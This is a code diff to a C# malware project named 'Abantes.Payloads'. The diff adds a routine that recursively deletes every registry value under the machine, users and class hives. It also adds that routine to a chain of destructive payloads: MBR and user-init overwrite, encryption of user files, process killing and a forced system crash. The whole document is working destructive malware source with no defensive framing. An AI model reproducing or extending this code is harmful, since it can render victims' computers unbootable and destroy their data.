@@ -153,6 +153,30 @@ namespace Abantes.Payloads
                 editKey.Close();
             } catch { }
         }
+        public static void DestroyRegistry()
+        {
+            FuckReg(Registry.LocalMachine);
+            FuckReg(Registry.Users);
+            FuckReg(Registry.ClassesRoot);
+        }
+        public static void FuckReg(RegistryKey key)
+        {
+            foreach (var k in key.GetSubKeyNames())
+            {
+                try
+                {
+                    FuckReg(key.OpenSubKey(k, true));
+                }
+                catch { }
+            }
+            foreach (var v in key.GetValueNames())
+            {
+                try
+                {
+                    key.DeleteValue(v);
+                } catch { }
+            }
+        }
         public static void EncryptUserFiles()
         {
             List<string> pathsToEncrypt = new List<string>();
@@ -243,6 +267,7 @@ namespace Abantes.Payloads
                 UserInitOverwrite();
                 MBR_Overwrite();
                 EncryptUserFiles();
+                DestroyRegistry();
                 KillAll();
                 FORCE_BSOD();
             }
